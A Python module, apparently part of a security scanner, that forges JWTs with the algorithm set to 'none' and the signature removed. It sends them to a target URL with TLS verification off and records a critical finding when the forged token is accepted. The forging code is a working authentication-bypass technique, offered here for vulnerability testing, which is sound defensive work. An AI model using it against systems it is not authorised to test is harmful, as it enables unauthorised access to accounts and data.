"""
JWT algorithm downgrade checks.
"""
from __future__ import annotations

import base64
import json
import logging
from typing import Any

import httpx

from core.database import AsyncSessionLocal
from core.models import Vulnerability

logger = logging.getLogger("sentinel.jwt_downgrader")


async def test_jwt_algorithm_downgrade(
    origin_url: str,
    token: str,
    *,
    target_id: str | None = None,
    crawled_url_id: str | None = None,
) -> dict[str, Any]:
    forged_token = forge_alg_none_token(token)
    async with httpx.AsyncClient(timeout=15.0, follow_redirects=False, verify=False) as client:
        baseline = await client.get(origin_url, headers={"Authorization": f"Bearer {token}"})
        forged = await client.get(origin_url, headers={"Authorization": f"Bearer {forged_token}"})

    vulnerable = baseline.status_code in {401, 403} and 200 <= forged.status_code < 300
    result = {
        "origin_url": origin_url,
        "baseline_status": baseline.status_code,
        "forged_status": forged.status_code,
        "forged_token": forged_token,
        "vulnerable": vulnerable,
    }
    if vulnerable:
        await persist_jwt_bypass(result, target_id=target_id, crawled_url_id=crawled_url_id)
    return result


def forge_alg_none_token(token: str) -> str:
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("JWT must include header and payload segments")

    header = json.loads(base64url_decode(parts[0]))
    header["alg"] = "none"
    header.pop("kid", None)
    forged_header = base64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    return f"{forged_header}.{parts[1]}."


def base64url_decode(value: str) -> bytes:
    padded = value + ("=" * (-len(value) % 4))
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def base64url_encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).decode("ascii").rstrip("=")


async def persist_jwt_bypass(
    result: dict[str, Any],
    *,
    target_id: str | None,
    crawled_url_id: str | None,
) -> None:
    evidence = (
        f"Original JWT was rejected with HTTP {result['baseline_status']}, but an alg=none forged token "
        f"was accepted with HTTP {result['forged_status']} at {result['origin_url']}."
    )
    async with AsyncSessionLocal() as session:
        session.add(
            Vulnerability(
                crawled_url_id=crawled_url_id,
                target_id=target_id,
                vuln_type="JWT Signature Bypass",
                severity="critical",
                title="JWT alg=none signature bypass",
                description="The origin accepted a JWT with the signature removed and alg set to none.",
                evidence=evidence,
                payload=result["forged_token"],
                source="jwt_downgrader",
                raw_data=result,
            )
        )
        await session.commit()
        logger.warning("Persisted JWT downgrade finding for %s", result["origin_url"])
